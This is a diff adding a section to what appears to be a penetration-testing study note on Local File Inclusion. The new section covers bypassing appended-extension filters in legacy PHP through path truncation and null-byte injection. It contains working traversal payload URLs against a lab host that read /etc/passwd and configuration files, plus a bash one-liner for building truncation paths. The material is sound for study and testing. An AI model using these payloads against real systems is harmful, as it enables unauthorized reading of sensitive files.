@@ -112,7 +112,7 @@ The above payload may work when input validation is performed before URL decodin
 
 ### Approved Paths Filter
 
-Some filters use regular expressions to ensure that any included file is under a specific path. An application may for example only accept included files under the **/languages/**. 
+Some filters use regular expressions to ensure that any included file is under a specific path. An application may for example only accept included files under the **/languages/** directory. 
 
 An approved paths filter might look like this when implemented in PHP:
 
@@ -156,3 +156,46 @@ http://83.136.253.59:34423/index.php?language=languages/....\/....\/....\/....\/
 # Recursive and URL encoded bypass
 http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
 ```
+
+### Appended Extensions Filter
+
+Some filters append file extensions (e.g. `.php`) to user-supplied input before including a file. This makes basic LFI attacks more difficult on modern PHP versions.
+
+However, **legacy PHP versions** may still be vulnerable to extension bypass techniques.
+
+In some older environments, excessively long file paths may be truncated due to internal path handling or filesystem limitations. If truncation occurs *before* the appended extension, the `.php` suffix may be removed, allowing arbitrary file inclusion.
+
+For this technique to work, the path typically needs to begin with a non-existing directory:
+
+```bash
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+```
+
+Older PHP versions (prior to PHP 5.3.4) may also be vulnerable to **null-byte injection**. By appending a null byte (**%00**) to the payload, filesystem functions may interpret the string as terminated, ignoring anything appended afterward (such as `.php`).
+
+**Examples:**
+
+```bash
+# Basic null-byte injection
+http://83.136.253.59:34423/index.php?language=../../../../configure%00.php
+```
+
+```bash
+# Prepended approved path
+http://83.136.253.59:34423/index.php?language=languages/../../../../configure%00.php
+```
+
+```bash
+# Recursive
+http://83.136.253.59:34423/index.php?language=languages/....//....//....//....//configure%00.php
+
+http://83.136.253.59:34423/index.php?language=languages/..././..././..././..././configure%00.php
+
+http://83.136.253.59:34423/index.php?language=languages/....\/....\/....\/....\/configure%00.php
+```
+
+```bash
+# URL encoded null-byte injection
+http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64%25%30%30%2e%70%68%70
+```
+
